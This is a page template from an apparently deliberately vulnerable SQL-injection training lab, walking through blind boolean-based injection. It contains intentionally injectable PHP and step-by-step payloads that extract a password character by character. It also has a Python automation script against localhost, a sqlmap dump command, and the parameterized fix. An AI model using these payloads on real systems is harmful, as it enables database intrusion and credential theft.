<?php if ( ! defined('SQL_INJECTION_IN_PHP') ) die('Direct access not permitted'); ?>

<nav aria-label="breadcrumb" class="mb-3">
  <ol class="breadcrumb">
    <li class="breadcrumb-item"><a href="?action=walkthroughs">Walkthroughs</a></li>
    <li class="breadcrumb-item active">Blind Boolean-Based</li>
  </ol>
</nav>

<div class="d-flex align-items-center gap-3 mb-4">
  <h2 class="mb-0">4. Blind Boolean-Based Injection</h2>
  <span class="badge bg-warning text-dark">Advanced</span>
  <span class="badge bg-secondary">Blind</span>
</div>

<div class="card mb-4">
  <div class="card-header bg-dark text-white"><strong>Overview</strong></div>
  <div class="card-body">
    <p>In blind boolean injection there is <strong>no data returned</strong> and <strong>no errors displayed</strong>. The attacker infers data by observing a binary difference in the page response — typically "found" vs "not found". By probing one character at a time, any value in the database can be extracted.</p>
    <p>This is significantly slower than UNION or error-based but works on locked-down applications that suppress output entirely.</p>
    <p class="mb-0"><strong>Affected file:</strong> <code>pages/blind_boolean.php</code></p>
  </div>
</div>

<div class="card mb-4 border-danger">
  <div class="card-header bg-danger text-white"><strong>Vulnerable Code</strong></div>
  <div class="card-body">
<pre class="bg-light p-3 rounded"><code>$uid = $_GET['uid'] ?? '';

$sql = "SELECT id FROM user WHERE id = {$uid}";

$pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_SILENT);
$result = $pdo->query($sql);

// Only two outcomes visible to the attacker:
if ($result && $result->rowCount() > 0) {
    echo "User found.";    // TRUE condition
} else {
    echo "User not found."; // FALSE condition
}</code></pre>
  </div>
</div>

<div class="card mb-4 border-warning">
  <div class="card-header bg-warning text-dark"><strong>Attack Walkthrough — Step by Step</strong></div>
  <div class="card-body">

    <h6 class="fw-bold">Step 1 — Confirm the binary behaviour</h6>
    <div class="bg-light p-2 rounded mb-1"><code>8</code> → "User found" (valid ID)</div>
    <div class="bg-light p-2 rounded mb-3"><code>999</code> → "User not found" (invalid ID)</div>

    <h6 class="fw-bold">Step 2 — Confirm injection is possible</h6>
    <div class="bg-light p-2 rounded mb-1"><code>8 AND 1=1</code> → "User found" (true condition)</div>
    <div class="bg-light p-2 rounded mb-3"><code>8 AND 1=2</code> → "User not found" (false condition — injection confirmed)</div>

    <h6 class="fw-bold">Step 3 — Probe the database name character by character</h6>
    <div class="bg-light p-2 rounded mb-1"><code>8 AND substring((SELECT database()),1,1)='s'</code> → found if DB name starts with 's'</div>
    <div class="bg-light p-2 rounded mb-1"><code>8 AND substring((SELECT database()),2,1)='q'</code> → probe 2nd character</div>
    <div class="bg-light p-2 rounded mb-3"><code>8 AND substring((SELECT database()),3,1)='l'</code> → probe 3rd character → reveals "sql..."</div>

    <h6 class="fw-bold">Step 4 — Confirm a table exists</h6>
    <div class="bg-light p-2 rounded mb-3"><code>8 AND (SELECT COUNT(*) FROM secret) > 0</code> → confirms secret table exists</div>

    <h6 class="fw-bold">Step 5 — Extract a password character by character</h6>
    <div class="bg-light p-2 rounded mb-1"><code>8 AND substring((SELECT password FROM user WHERE id=8),1,1)='1'</code> → 1st char is '1'</div>
    <div class="bg-light p-2 rounded mb-1"><code>8 AND substring((SELECT password FROM user WHERE id=8),2,1)='2'</code> → 2nd char is '2'</div>
    <div class="bg-light p-2 rounded mb-3"><code>8 AND substring((SELECT password FROM user WHERE id=8),3,1)='3'</code> → 3rd char is '3' → password starts "123..."</div>

    <h6 class="fw-bold">Step 6 — Automate with ASCII comparison (faster)</h6>
    <p class="small">Use <code>ascii()</code> with binary search rather than comparing one character at a time:</p>
    <div class="bg-light p-2 rounded mb-3">
      <code>8 AND ascii(substring((SELECT password FROM user WHERE id=8),1,1)) > 64</code>
    </div>

    <a href="?action=blind_boolean" class="btn btn-sm btn-outline-warning">Open Blind Boolean Demo →</a>
  </div>
</div>

<div class="card mb-4 border-info">
  <div class="card-header bg-info text-white"><strong>Python Script — Automate Character Extraction</strong></div>
  <div class="card-body">
<pre class="bg-light p-3 rounded small"><code>import requests

BASE = "http://localhost:8080/profile.php"
CHARS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$"

def extract_value(query, max_len=32):
    result = ""
    for pos in range(1, max_len + 1):
        found = False
        for char in CHARS:
            payload = f"8 AND substring(({query}),{pos},1)='{char}'"
            r = requests.get(BASE, params={"action": "blind_boolean", "uid": payload})
            if "User found" in r.text:
                result += char
                found = True
                break
        if not found:
            break  # end of string
    return result

print("DB name:  ", extract_value("SELECT database()"))
print("Password: ", extract_value("SELECT password FROM user WHERE id=8"))
</code></pre>
  </div>
</div>

<div class="card mb-4 border-success">
  <div class="card-header bg-success text-white"><strong>Fix</strong></div>
  <div class="card-body">
<pre class="bg-light p-3 rounded"><code>$stmt = $pdo->prepare("SELECT id FROM user WHERE id = :id");
$stmt->execute([':id' => (int) $uid]);

if ($stmt->rowCount() > 0) {
    echo "User found.";
} else {
    echo "User not found.";
}</code></pre>
    <p class="mb-0 text-success">The <code>AND substring(...)</code> payload is bound as a parameter. It becomes part of the literal value being compared to <code>id</code>, so it's never executed as SQL.</p>
  </div>
</div>

<div class="card">
  <div class="card-header bg-secondary text-white"><strong>Tools</strong></div>
  <div class="card-body">
    <pre class="bg-light p-2 rounded small">sqlmap -u "http://localhost:8080/profile.php?action=blind_boolean&uid=8" \
  --technique=B --dump -T user -C email,password --batch --level=3</pre>
    <p class="small mb-0">sqlmap's boolean technique (<code>-T B</code>) will automate exactly this character-by-character extraction.</p>
  </div>
</div>
